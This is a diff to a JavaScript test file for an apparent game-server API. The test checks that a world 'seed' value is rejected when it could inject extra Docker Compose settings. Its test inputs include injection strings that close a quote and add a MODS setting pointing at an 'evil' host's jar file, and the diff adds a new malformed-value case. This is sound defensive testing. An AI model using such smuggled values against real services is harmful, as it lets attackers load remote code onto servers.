@@ -51,6 +51,8 @@ describe('POST /api/worlds seed must be a single line (#726)', () => {
     // Compose closes the quote and reads MODS as another setting
     '"" MODS=http://evil/x.jar',
     "'' MODS=http://evil/x.jar",
+    // Needs quotes for the $; Compose reads 'seed$VAR\' as an unterminated value (#675)
+    'seed$VAR\\',
   ])('rejects seed %j with 400 and leaves config.env and worlds alone', async (seed) => {
     const response = await app.inject({
       method: 'POST',
